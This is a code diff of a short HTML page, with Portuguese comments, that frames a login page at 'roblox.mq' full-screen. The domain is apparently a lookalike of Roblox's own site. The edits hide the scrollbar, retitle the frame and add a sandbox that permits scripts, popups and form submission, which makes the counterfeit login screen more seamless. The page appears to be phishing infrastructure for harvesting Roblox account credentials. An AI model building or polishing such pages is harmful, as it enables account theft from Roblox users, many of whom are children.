@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iframe Full Screen</title>
+    <title>Iframe Fullscreen</title>
     <style>
         /* Garantir que o body ocupe toda a altura da tela */
         body, html {
             margin: 0;
             padding: 0;
             height: 100%;  /* O corpo e o html devem ter 100% da altura da tela */
+            overflow: hidden;  /* Remover a barra de rolagem */
         }
 
         /* Tornar o iframe responsivo e ocupar a tela inteira */
@@ -26,7 +27,7 @@
 <body>
 
     <!-- Iframe que cobre toda a tela -->
-    <iframe src="https://roblox.mq/login?returnUrl=7004626442388459" title="Log in to Roblox"></iframe>
+    <iframe src="https://roblox.mq/login?returnUrl=7004626442388459" title="Site Externo" sandbox="allow-scripts allow-same-origin allow-popups allow-forms"></iframe>
 
 </body>
 </html>
